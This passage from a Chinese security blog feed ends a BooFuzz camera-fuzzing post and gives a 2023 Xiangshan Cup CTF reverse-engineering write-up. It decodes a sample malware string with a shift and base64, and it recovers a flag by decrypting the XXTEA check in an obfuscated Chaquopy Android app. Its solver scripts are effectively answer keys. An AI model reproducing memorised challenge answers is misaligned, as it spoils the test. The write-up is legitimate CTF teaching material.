src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/5.png" alt="5"></p><p>脚本还在运行时，可以访问localhost:26000查看本次fuzz相关信息(触发crash的case，case详细信息等)</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/6.png" alt="6"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/jtpereyda/boofuzz">boofuzz github</a></p><p><a href="https://boofuzz.readthedocs.io/en/stable/">boofuzz手册</a></p><p><a href="https://blog.csdn.net/weixin_46222091/article/details/119334375">[csdn] BooFuzz协议漏洞挖掘入门教程与使用心得</a></p><p><a href="https://blog.csdn.net/song_lee/article/details/104334096">[csdn] IoT 设备网络协议模糊测试工具boofuzz实战</a></p><p><a href>[知乎] BooFuzz实战 Vivotek的Fuzzing 栈溢出</a></p><p><a href="https://aslr.io/2020/02/03/iot-web-server-cgi-handler-analysis/">常见嵌入式Web服务器CGI处理功能简要分析 (aslr.io)</a></p><p><a href="https://wokough.gitbook.io/iot-firmware-aio/wiki/fang-zhen-fen-xi">IOT固件安全all in one - 固件仿真</a></p>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>BooFuzz</tag>
      
      <tag>Vivotek</tag>
      
      <tag>漏洞挖掘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023香山杯RE&amp;PWN writeup</title>
    <link href="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/"/>
    <url>/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/</url>
    
    <content type="html"><![CDATA[<h1 id="2023香山杯RE-amp-PWN-writeup"><a href="#2023香山杯RE-amp-PWN-writeup" class="headerlink" title="2023香山杯RE&amp;PWN writeup"></a>2023香山杯RE&amp;PWN writeup</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="URL从哪来"><a href="#URL从哪来" class="headerlink" title="URL从哪来"></a>URL从哪来</h2><p>32位windows恶意软件分析</p><p>微步检测<img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231015153202.png" alt="1"></p><p>题目给的exe又在c盘生成了另一个程序并创建进程，ou.exe可以直接从微步下载，或者根据偏移提取</p><p>分析c盘中真正的恶意程序对数据进行逐位-30和base64加密</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs smali">v3[0] = 120;<br>v3[1] = 139;<br>v3[2] = 150;<br>v3[3] = 134;<br>v3[4] = 120;<br>v3[5] = 81;<br>v3[6] = 145;<br>v3[7] = 80;<br>v3[8] = 108;<br>v3[9] = 98;<br>v3[10] = 119;<br>v3[11] = 83;<br>v3[12] = 108;<br>v3[13] = 136;<br>v3[14] = 99;<br>v3[15] = 80;<br>v3[16] = 120;<br>v3[17] = 113;<br>v3[18] = 78;<br>v3[19] = 80;<br>v3[20] = 107;<br>v3[21] = 152;<br>v3[22] = 119;<br>v3[23] = 83;<br>v3[24] = 106;<br>v3[25] = 114;<br>v3[26] = 119;<br>v3[27] = 151;<br>v3[28] = 108;<br>v3[29] = 139;<br>v3[30] = 119;<br>v3[31] = 146;<br>v3[32] = 108;<br>v3[33] = 152;<br>v3[34] = 99;<br>v3[35] = 80;<br>v3[36] = 109;<br>v3[37] = 113;<br>v3[38] = 78;<br>v3[39] = 81;<br>v3[40] = 108;<br>v3[41] = 98;<br>v3[42] = 119;<br>v3[43] = 150;<br>v3[44] = 108;<br>v3[45] = 152;<br>v3[46] = 95;<br>v3[47] = 80;<br>v3[48] = 107;<br>v3[49] = 114;<br>v3[50] = 129;<br>v3[51] = 81;<br>v3[52] = 108;<br>v3[53] = 136;<br>v3[54] = 100;<br>v3[55] = 87;<br>v14 = 56;<br>Block = malloc(0x39u);<span class="hljs-built_in"></span><br><span class="hljs-built_in">if </span>( !Block )<br> <span class="hljs-built_in"> return </span>1;<br>memset(Block, 0, v14 + 1);<br>for ( i = 0; i &lt; v14; ++i )<br>  *((_BYTE *)Block + i) = LOBYTE(v3[i]) - 30;<br>v13 = sub_401110((const char *)Block);<br></code></pre></td></tr></table></figure><p>写脚本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import <span class="hljs-built_in">base64</span><br>v3 = [<span class="hljs-number">120</span>, <span class="hljs-number">139</span>, <span class="hljs-number">150</span>, <span class="hljs-number">134</span>, <span class="hljs-number">120</span>, <span class="hljs-number">81</span>, <span class="hljs-number">145</span>, <span class="hljs-number">80</span>, <span class="hljs-number">108</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">83</span>, <span class="hljs-number">108</span>, <span class="hljs-number">136</span>, <span class="hljs-number">99</span>, <span class="hljs-number">80</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">107</span>, <span class="hljs-number">152</span>, <span class="hljs-number">119</span>, <span class="hljs-number">83</span>, <span class="hljs-number">106</span>, <span class="hljs-number">114</span>, <span class="hljs-number">119</span>, <span class="hljs-number">151</span>, <span class="hljs-number">108</span>, <span class="hljs-number">139</span>, <span class="hljs-number">119</span>, <span class="hljs-number">146</span>, <span class="hljs-number">108</span>, <span class="hljs-number">152</span>, <span class="hljs-number">99</span>, <span class="hljs-number">80</span>, <span class="hljs-number">109</span>, <span class="hljs-number">113</span>, <span class="hljs-number">78</span>, <span class="hljs-number">81</span>, <span class="hljs-number">108</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">150</span>, <span class="hljs-number">108</span>, <span class="hljs-number">152</span>, <span class="hljs-number">95</span>, <span class="hljs-number">80</span>, <span class="hljs-number">107</span>, <span class="hljs-number">114</span>, <span class="hljs-number">129</span>, <span class="hljs-number">81</span>, <span class="hljs-number">108</span>, <span class="hljs-number">136</span>, <span class="hljs-number">100</span>, <span class="hljs-number">87</span>]<br><span class="hljs-built_in">block</span> = &#x27;&#x27;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v3:<br>    <span class="hljs-built_in">block</span> += chr(i-<span class="hljs-number">30</span>)<br><br><span class="hljs-built_in">block</span> = <span class="hljs-built_in">base64</span>.b64decode(<span class="hljs-built_in">block</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">block</span>)<br></code></pre></td></tr></table></figure><h2 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h2><p>chaquopy框架app的逆向</p><p><a href="https://blog.csdn.net/wwb1990/article/details/104051068">https://blog.csdn.net/wwb1990/article/details/104051068</a></p><p>java层找到MainActivity和import导入的b.c.a.a</p><p>这里应该是类似导入python代码，可以推测python文件名应该是hello</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">s</span> <span class="hljs-operator">=</span> Python.getInstance().getModule(<span class="hljs-string">&quot;hello&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里通过callAttr调用了sayhello函数</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">s.callAttr(<span class="hljs-string">&quot;sayHello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>这里应该是监听鼠标点击按钮的事件，触发后跳转到a，即b.c.a.a</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-built_in">this</span>.p.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-type">a</span>(<span class="hljs-built_in">this</span>));<br></code></pre></td></tr></table></figure><p>找到这里，最关键的check函数是python源码中的函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void on<span class="hljs-constructor">Click(View <span class="hljs-params">view</span>)</span> &#123;<br>        Context baseContext;<br>        String str;<br>        String obj = this.f717b.r.get<span class="hljs-constructor">Text()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;<br>        this.f717b.q.set<span class="hljs-constructor">Text(<span class="hljs-params">obj</span>)</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MainActivity</span>.</span></span>s.call<span class="hljs-constructor">Attr(<span class="hljs-string">&quot;check&quot;</span>, <span class="hljs-params">obj</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">Boolean()</span>) &#123;<br>            baseContext = this.f717b.get<span class="hljs-constructor">BaseContext()</span>;<br>            str = <span class="hljs-string">&quot;you are right~ flag is flag&#123;your input&#125;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            baseContext = this.f717b.get<span class="hljs-constructor">BaseContext()</span>;<br>            str = <span class="hljs-string">&quot;Wrong!&quot;</span>;<br>        &#125;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Toast</span>.</span></span>make<span class="hljs-constructor">Text(<span class="hljs-params">baseContext</span>, <span class="hljs-params">str</span>, 1)</span>.show<span class="hljs-literal">()</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>问了chatgpt，该框架app打包后的python代码位于assets文件夹，但是里面只有.imy文件和so文件，so文件翻了一遍，都不像是有check函数，查看imy文件时发现开头都是PK，可能是压缩包，换后缀名为rar解压发现app.imy中就是hello.py</p><p>代码都是混淆后的，用pycharm对代码进行简单的重命名，如下对check函数进行了简单去混淆，分析可得加密流程是先将字符串四个字节一组小端序转换为int数组，一共36个字符9个int，然后xxtea加密，xxtea的特征有0x9e3779b9，5234的位移，6 + 52，</p><p>这题的xxtea代码和<a href="https://blog.csdn.net/A951860555/article/details/120120400">该博客</a>的一模一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> java <span class="hljs-keyword">import</span> jboolean ,jclass <span class="hljs-comment">#line:1</span><br><span class="hljs-keyword">import</span> struct <span class="hljs-comment">#line:3</span><br><span class="hljs-keyword">import</span> ctypes <span class="hljs-comment">#line:4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MX</span> (O0O00OOO00OO00O00 ,O0OO0O00OO0O000OO ,OO000OO000000O0O0 ,OOO00O00OOO000OOO ,OO0OOO0OOO0OOOO0O ,O0OO000O0000O000O ):<span class="hljs-comment">#line:7</span><br>    OOO000O0O0OO00000 =(O0O00OOO00OO00O00 .value &gt;&gt;<span class="hljs-number">5</span> ^O0OO0O00OO0O000OO .value &lt;&lt;<span class="hljs-number">2</span> )+(O0OO0O00OO0O000OO .value &gt;&gt;<span class="hljs-number">3</span> ^O0O00OOO00OO00O00 .value &lt;&lt;<span class="hljs-number">4</span> )<span class="hljs-comment">#line:8</span><br>    OOO0OOOOOO0O0OO00 =(OO000OO000000O0O0 .value ^O0OO0O00OO0O000OO .value )+(OOO00O00OOO000OOO [(OO0OOO0OOO0OOOO0O &amp;<span class="hljs-number">3</span> )^O0OO000O0000O000O .value ]^O0O00OOO00OO00O00 .value )<span class="hljs-comment">#line:9</span><br>    <span class="hljs-keyword">return</span> ctypes .c_uint32 (OOO000O0O0OO00000 ^OOO0OOOOOO0O0OO00 )<span class="hljs-comment">#line:11</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span> (n, <span class="hljs-built_in">input</span>, key):<span class="hljs-comment">#line:14</span><br>    O0OOO0OO00O0000OO =<span class="hljs-number">0x9e3779b9</span> <span class="hljs-comment">#line:15</span><br>    OOOO0OOOO00O0OOOO = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n <span class="hljs-comment">#line:16</span><br>    O00OO00000O0OO00O =ctypes .c_uint32 (<span class="hljs-number">0</span> )<span class="hljs-comment">#line:18</span><br>    OO0OOOO0O0O0O0OO0 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>])<span class="hljs-comment">#line:19</span><br>    OOOOO00000OOOOOOO =ctypes .c_uint32 (<span class="hljs-number">0</span> )<span class="hljs-comment">#line:20</span><br>    <span class="hljs-keyword">while</span> OOOO0OOOO00O0OOOO &gt;<span class="hljs-number">0</span> :<span class="hljs-comment">#line:22</span><br>        O00OO00000O0OO00O .value +=O0OOO0OO00O0000OO <span class="hljs-comment">#line:23</span><br>        OOOOO00000OOOOOOO .value =(O00OO00000O0OO00O .value &gt;&gt;<span class="hljs-number">2</span> )&amp;<span class="hljs-number">3</span> <span class="hljs-comment">#line:24</span><br>        <span class="hljs-keyword">for</span> OO0O0OOO000O0000O <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (n - <span class="hljs-number">1</span>):<span class="hljs-comment">#line:25</span><br>            OOO0OO00O0OO0O000 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O + <span class="hljs-number">1</span>])<span class="hljs-comment">#line:26</span><br>            <span class="hljs-built_in">input</span> [OO0O0OOO000O0000O]=ctypes .c_uint32 (<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O] + MX (OO0OOOO0O0O0O0OO0, OOO0OO00O0OO0O000, O00OO00000O0OO00O, key, OO0O0OOO000O0000O, OOOOO00000OOOOOOO).value).value <span class="hljs-comment">#line:27</span><br>            OO0OOOO0O0O0O0OO0 .value =<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O]<span class="hljs-comment">#line:28</span><br>        OOO0OO00O0OO0O000 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [<span class="hljs-number">0</span>])<span class="hljs-comment">#line:29</span><br>        <span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>]=ctypes .c_uint32 (<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>] + MX (OO0OOOO0O0O0O0OO0, OOO0OO00O0OO0O000, O00OO00000O0OO00O, key, n - <span class="hljs-number">1</span>, OOOOO00000OOOOOOO).value).value <span class="hljs-comment">#line:30</span><br>        OO0OOOO0O0O0O0OO0 .value =<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>]<span class="hljs-comment">#line:31</span><br>        OOOO0OOOO00O0OOOO -=<span class="hljs-number">1</span> <span class="hljs-comment">#line:32</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span> <span class="hljs-comment">#line:34</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span> (<span class="hljs-built_in">input</span>):<span class="hljs-comment">#line:63</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;checking~~~: &quot;</span> + <span class="hljs-built_in">input</span>)<span class="hljs-comment">#line:64</span><br>    <span class="hljs-built_in">input</span> =<span class="hljs-built_in">str</span> (<span class="hljs-built_in">input</span>)<span class="hljs-comment">#line:65</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (<span class="hljs-built_in">input</span>)!=<span class="hljs-number">36</span> :<span class="hljs-comment">#line:66</span><br>        <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">False</span> )<span class="hljs-comment">#line:67</span><br>    v1 =[]<span class="hljs-comment">#line:69</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span> ,<span class="hljs-number">36</span> ,<span class="hljs-number">4</span> ):<span class="hljs-comment">#line:70</span><br>        result = <span class="hljs-built_in">input</span> [i:i + <span class="hljs-number">4</span>].encode (<span class="hljs-string">&#x27;latin-1&#x27;</span>)<span class="hljs-comment">#line:71          每四字节按latin-1编码</span><br>        v1 .append (result )<span class="hljs-comment">#line:72</span><br>    v2 =[]<span class="hljs-comment">#line:73</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v1 :<span class="hljs-comment">#line:74</span><br>        v2 .append (struct .unpack (<span class="hljs-string">&quot;&lt;I&quot;</span>,i )[<span class="hljs-number">0</span> ])<span class="hljs-comment">#line:75 将四字节int按小端序打包</span><br>    <span class="hljs-built_in">print</span> (v2 )<span class="hljs-comment">#line:77</span><br>    result =encrypt (<span class="hljs-number">9</span> ,v2 ,[<span class="hljs-number">12345678</span> ,<span class="hljs-number">12398712</span> ,<span class="hljs-number">91283904</span> ,<span class="hljs-number">12378192</span> ])<span class="hljs-comment">#line:78</span><br>    chiper =[<span class="hljs-number">689085350</span> ,<span class="hljs-number">626885696</span> ,<span class="hljs-number">1894439255</span> ,<span class="hljs-number">1204672445</span> ,<span class="hljs-number">1869189675</span> ,<span class="hljs-number">475967424</span> ,<span class="hljs-number">1932042439</span> ,<span class="hljs-number">1280104741</span> ,<span class="hljs-number">2808893494</span> ]<span class="hljs-comment">#line:85</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">9</span> ):<span class="hljs-comment">#line:86</span><br>        <span class="hljs-keyword">if</span> chiper [i ]!=result [i ]:<span class="hljs-comment">#line:87</span><br>            <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">False</span> )<span class="hljs-comment">#line:88</span><br>    <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">True</span> )<span class="hljs-comment">#line:90</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sayHello</span> ():<span class="hljs-comment">#line:92</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;hello from py&quot;</span>)<span class="hljs-comment">#line:93</span><br></code></pre></td></tr></table></figure><p>脚本，注意解密后需要每四字节转换端序后再转化成字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MX</span>(<span class="hljs-params">z, y, total, key, p, e</span>):<br>    temp1 = (z.value &gt;&gt; <span class="hljs-number">5</span> ^ y.value &lt;&lt; <span class="hljs-number">2</span>) + (y.value &gt;&gt; <span class="hljs-number">3</span> ^ z.value &lt;&lt; <span class="hljs-number">4</span>)<br>    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="hljs-number">3</span>) ^ e.value] ^ z.value)<br><br>    <span class="hljs-keyword">return</span> c_uint32(temp1 ^ temp2)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">n, v, key</span>):<br>    delta = <span class="hljs-number">0x9e3779b9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n<br><br>    total = c_uint32(<span class="hljs-number">0</span>)<br>    z = c_uint32(v[n - <span class="hljs-number">1</span>])<br>    e = c_uint32(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:<br>        total.value += delta<br>        e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>):<br>            y = c_uint32(v[p + <span class="hljs-number">1</span>])<br>            v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value<br>            z.value = v[p]<br>        y = c_uint32(v[<span class="hljs-number">0</span>])<br>        v[n - <span class="hljs-number">1</span>] = c_uint32(v[n - <span class="hljs-number">1</span>] + MX(z, y, total, key, n - <span class="hljs-number">1</span>, e).value).value<br>        z.value = v[n - <span class="hljs-number">1</span>]<br>        rounds -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">n, v, key</span>):<br>    delta = <span class="hljs-number">0x9e3779b9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n<br><br>    total = c_uint32(rounds * delta)<br>    y = c_uint32(v[<span class="hljs-number">0</span>])<br>    e = c_uint32(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:<br>        e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            z = c_uint32(v[p - <span class="hljs-number">1</span>])<br>            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value<br>            y.value = v[p]<br>        z = c_uint32(v[n - <span class="hljs-number">1</span>])<br>        v[<span class="hljs-number">0</span>] = c_uint32(v[<span class="hljs-number">0</span>] - MX(z, y, total, key, <span class="hljs-number">0</span>, e).value).value<br>        y.value = v[<span class="hljs-number">0</span>]<br>        total.value -= delta<br>        rounds -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    k = [<span class="hljs-number">12345678</span> ,<span class="hljs-number">12398712</span> ,<span class="hljs-number">91283904</span> ,<span class="hljs-number">12378192</span> ]<br>    n = <span class="hljs-number">9</span><br>    res = [<span class="hljs-number">689085350</span> ,<span class="hljs-number">626885696</span> ,<span class="hljs-number">1894439255</span> ,<span class="hljs-number">1204672445</span> ,<span class="hljs-number">1869189675</span> ,<span class="hljs-number">475967424</span> ,<span class="hljs-number">1932042439</span> ,<span class="hljs-number">1280104741</span> ,<span class="hljs-number">2808893494</span> ]<br>    res = decrypt(n, res, k)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">2</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">3</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">4</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">5</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">6</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">7</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">8</span>]))<br>    v1 = [<span class="hljs-string">b&#x27;\x38\x66\x31\x63&#x27;</span>, <span class="hljs-string">b&#x27;\x36\x65\x63\x61&#x27;</span>, <span class="hljs-string">b&#x27;\x34\x62\x34\x2d&#x27;</span>, <span class="hljs-string">b&#x27;\x39\x34\x2d\x36&#x27;</span>, <span class="hljs-string">b&#x27;\x62\x2d\x31\x33&#x27;</span>, <span class="hljs-string">b&#x27;\x2d\x62\x35\x32&#x27;</span>, <span class="hljs-string">b&#x27;\x31\x30\x31\x61&#x27;</span>, <span class="hljs-string">b&#x27;\x39\x38\x61\x30&#x27;</span>, <span class="hljs-string">b&#x27;\x32\x39\x35\x63&#x27;</span>]<br>    v2 = []  <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v1:  <br>        v2.append(struct.unpack(<span class="hljs-string">&quot;&lt;I&quot;</span>, i)[<span class="hljs-number">0</span>])<br>    <span class="hljs-built_in">print</span>(v2)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v2[i]),end=<span class="hljs-string">&#x27; &#x27;</span>)<br>  <span class="hljs-comment">#63316638616365362d346234362d343933312d623235622d613130313061383963353932</span><br>    asc = <span class="hljs-string">&#x27;63316638616365362d346234362d343933312d623235622d613130313061383963353932&#x27;</span><br>    <span class="hljs-built_in">str</span> = binascii.unhexlify(asc)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure><h2 id="nesting"><a href="#nesting" class="headerlink" 